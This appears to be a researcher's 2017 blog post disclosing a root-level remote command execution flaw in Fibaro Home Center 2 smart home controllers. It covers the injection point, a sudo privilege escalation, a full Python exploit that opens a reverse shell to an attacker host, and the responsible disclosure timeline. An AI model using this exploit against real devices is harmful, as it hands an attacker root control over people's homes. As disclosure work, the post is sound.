---
id: 432
title: 'Smart home: remote command execution (RCE)'
date: 2017-09-27T08:15:59+01:00
author: wesley
layout: post
permalink: /2017/09/smart-home-remote-command-execution-rce/
---
During my spare time I am playing around with smart home/domotica/internet of things hardware and software.[<img style="float: right;" src="/wp-content/uploads/2017/09/fibaro_logo.jpg" alt="" width="248" height="74" />](/wp-content/uploads/2017/09/fibaro_logo.jpg) A while ago I decided to take a look at the security of these solutions, just because I was curious and because it&#8217;s fun. Within this research only smart home controllers were investigated. The controllers are the brain within a smart home, whenever an attacker gains access to this component, he is able to control the complete smart home.

<!--more-->

I&#8217;ve reported some vulnerabilities to the developer of the open-source project Domoticz. The developer fixed issues quickly and I&#8217;ve also commited some code for the bug fixes myself:

  * [Httponly flag](https://github.com/domoticz/domoticz/pull/1515/files)
  * [(Authenticated) SQL injection and buffer overflow](https://github.com/domoticz/domoticz/pull/1569/files)
  * [(Authenticated) remote command execution (fixed by the Domoticz developer)](https://github.com/domoticz/domoticz/commit/2934cffe1772475cddf40a4054f67de201b96a44)

Next to the open-source product I decided to investigate commercial products. One of these products was the Fibaro Home Center 2. During this research I stumbled on a critical vulnerability that allows an attacker to take full control (root access) on a Fibaro Home Center 2 and Fibaro Home Center Lite device whenever the web interface is accessible.

The video below shows an Fibaro Home Center 2 being exploited :):

<iframe width="420" height="315" src="https://www.youtube.com/embed/LLfy52a1C5A" frameborder="0" allowfullscreen></iframe>

<span style="font-size: 1rem;"><i>Opening the case</i></span>

<span style="font-size: 1rem;">I borrowed an Fibaro Home Center 2 (HC2) from one of my colleagues (thanks Martijn Teelen!). The Fibaro HC2 is just an x86 computer in a fancy case. The operating system was running on a USB-stick, another USB-stick was present as recovery.</span>

_[<img class="alignnone size-full wp-image-437" src="https://forsec.nl/wp-content/uploads/2017/07/fhc2.png" alt="" width="1319" height="1011" />](https://forsec.nl/wp-content/uploads/2017/07/fhc2.png)_

After opening the case I created disk images (dd) of the USB-sticks present in the Fibaro HC2. Now the cool things starts, digging into the internal system to understand how it works and to find a critical vulnerability.

[<img class="wp-image-439 alignnone" src="https://forsec.nl/wp-content/uploads/2017/07/c51YEoM.gif" alt="" width="297" height="271" />](https://forsec.nl/wp-content/uploads/2017/07/c51YEoM.gif)

_Searching for a critical vulnerability_

The PHP files of the web application were partially encoded with ionCube. After searching a tool was found that makes the decoding of the PHP files pretty easy. After decoding I stumbled upon a file (liliSetDeviceCommand.php) that performs a PHP system call using POST-input values, without checking for authentication and/or validating the input correctly.

[<img class="alignnone size-full wp-image-464" src="https://forsec.nl/wp-content/uploads/2017/07/fcode18374928382.png" alt="" width="1600" height="134" />](https://forsec.nl/wp-content/uploads/2017/07/fcode18374928382.png)

In order to test whether the vulnerability was exploitable, I injected\`ping${IFS}8.8.8.8\` into the &#8220;cmd1&#8221; parameter:

[<img class="alignnone wp-image-448" src="https://forsec.nl/wp-content/uploads/2017/07/fburp09382847392392.png" alt="" width="818" height="242" />](https://forsec.nl/wp-content/uploads/2017/07/fburp09382847392392.png)

A htop showed that the command was successfully injected:

[<img class="alignnone wp-image-450" src="https://forsec.nl/wp-content/uploads/2017/07/fhtop183848757242.png" alt="" width="735" height="321" />](https://forsec.nl/wp-content/uploads/2017/07/fhtop183848757242.png)

At this point it was verified that it is possible to gain command execution. However, the privileges were still limited to the www-data user because of the backticks being used as injection. Backticks were required because an addslashes was performed on the input.

_Privilege escalation_

Looking into the /etc/sudoers showed that the www-data user has permissions to run a couple of binaries under root privileges:

[<img class="alignnone wp-image-451" src="https://forsec.nl/wp-content/uploads/2017/07/fsudoers238984938.png" alt="" width="667" height="80" />](https://forsec.nl/wp-content/uploads/2017/07/fsudoers238984938.png)

Note the &#8220;/usr/bin/update&#8221; binary. After investigating this binary it became clear that this binary can be used to &#8220;manually&#8221; install an update. In order to do this an .tar.gz file needs be passed when calling this binary. The. tar.gz needs to contain a &#8220;run.sh&#8221;, this file contains the commands used in a update to perform update actions, such as copying files. So, lets try to put an reverse shell within this run.sh file, will we obtain a reverse shell under root privileges? During manual testing it became clear that this works.

_Writing the exploit_

Now a (quick and dirty) exploit was written chaining the remote command execution and the privilege escalation together, see the code below (tested on Home Center 2):

{% highlight python %}#!/usr/bin/python

import requests
import argparse
import urllib
import base64
import tarfile
import os

parser = argparse.ArgumentParser(description='Fibaro RCE')
parser.add_argument('--rhost')
parser.add_argument('--lhost')
parser.add_argument('--lport')
args = parser.parse_args()

f = open('run.sh', 'w')
f.write('#!/bin/bash\n')
f.write('/bin/bash -i &gt;& /dev/tcp/' + args.lhost + '/' + args.lport + ' 0&gt;&1\n')
f.close()

os.chmod('run.sh', 0777)

tar = tarfile.open("root.tar.gz", "w:gz")
tar.add("run.sh")
tar.close()

with open("root.tar.gz", "rb") as tarfile:
tar64 = base64.b64encode(tarfile.read())

wwwexec = urllib.quote_plus(base64.b64encode("echo '" + tar64 + "' | base64 -d &gt; /tmp/patch.tar.gz && sudo update --manual /tmp/patch.tar.gz"))

os.remove('run.sh')
os.remove('root.tar.gz')

headers = {
'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0',
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'X-Fibaro-Version': '2',
'X-Requested-With': 'XMLHttpRequest',
}

data = 'deviceID=1&deviceName=&deviceType=&cmd1=`echo${IFS}' + wwwexec + '|base64${IFS}-d|/bin/bash`&cmd2=&roomID=1&roomName=&sectionID=&sectionName=&lang=en'
print "[+] Popping a root shell..."

requests.post('http://' + args.rhost + '/services/liliSetDeviceCommand.php', headers=headers, data=data, verify=False)
{% endhighlight %}

_Responsible disclosure_

I&#8217;ve reported above described vulnerabilities to Fibaro. I tried to contact Fibaro multiple times and first came in contact with an employee that did not give the discovered vulnerability the priority it deserved. The employee communicated that the issue was being fixed by developers, however after 100+ days the vulnerability was still not fixed. This was frustrating, however I kept trying contacting employees of Fibaro. This is a timeline of the responsible disclosure report:

  * 22/02/2017: Reported the vulnerability.
  * 01/03/2017: Employee asked to verify whether the bug was fixed. Checked and it was not fixed.
  * 02/03/2017: Employee communicated that the vulnerability is being fixed right now.
  * 08/05/2017: Verified the newest firmware. Vulnerability still present, communicated this to the contact person. No reply.
  * 15/06/2017: Verified the newest firmware. Vulnerability still present, communicated that I will post my findings in a blog. No reply.
  * 20/06/2017: Contacted management employee of Fibaro through LinkedIn, replies directly.
  * 21/06/2017: Technical employee contacting me that an fix is being implemented.
  * 23/06/2017: Decided to sent my exploit and video to make sure everything is clear to the technical employee.
  * 28/06/2017: Vulnerability fixed, technical employee asked to verify the patch.
  * 03/07/2017: Patch received from Fibaro.
  * 04/07/2017: Verified that the patch fixes the RCE vulnerability.
  * 05/07/2017: Technical and management employees are happy with my findings and decide to send me a gift 🙂
  * 14/09/2017: Patch released.

After contacting other employees (a management employee) through LinkedIn I came in contact with an technical enthusiastic employee of Fibaro, from there the problem was picked up very adequate and the vulnerability was solved. I supported Fibaro on verifying their patch for the vulnerability, they repeated multiple times that my support was really appreciated :).

They even sent me an awesome gift (thanks Fibaro):

[<img class="alignnone size-full wp-image-482" src="https://forsec.nl/wp-content/uploads/2017/09/fibaro_gift_asdfasdfasdf_IMG_1062.jpg" alt="" width="664" height="885" />](https://forsec.nl/wp-content/uploads/2017/09/fibaro_gift_asdfasdfasdf_IMG_1062.jpg)

I recommended Fibaro to add an responsible disclosure on their website, with an e-mailaddress to contact in case of an security vulnerability. This can save frustration of other security researchers in the future :).

_Conclusion_

For Fibaro users, install the new Fibaro update 4.140 to patch the vulnerability. For all domotica users, be aware of the risks when connecting internet of things devices directly onto the internet. Next to the above exploit example, I discovered lots of internet of things devices connected onto the internet using Shodan. It is possible to connect to these devices to read and/or control them. If remote management of internet of things devices is required, it is wise to disclose them using an VPN-server. Also I would like to recommend network segmentation whenever implementing Domotica devices onto your local network, implement a DMZ (for internet-facing devices) and/or Domotica VLAN to seperate the devices from the regular network.

**UPDATE 10 October 2017**

How cool! Received an unannounced gift from Fibaro after blogging my findings. This is much appreciated. Thanks Fibaro!

[<img class="alignnone size-full wp-image-496" src="https://forsec.nl/wp-content/uploads/2017/09/fibarogift.png" alt="" width="939" height="858" />](https://forsec.nl/wp-content/uploads/2017/09/fibarogift.png)

**UPDATE 15 November 2017**

Really cool! Received a gift from the guys behind the open-source project Domoticz for reporting (and solving some) vulnerabilities. Thanks!

[<img class="alignnone size-full wp-image-498" src="https://forsec.nl/wp-content/uploads/2017/09/IMG_1366.jpg" alt="" width="1836" height="2448" />](https://forsec.nl/wp-content/uploads/2017/09/IMG_1366.jpg)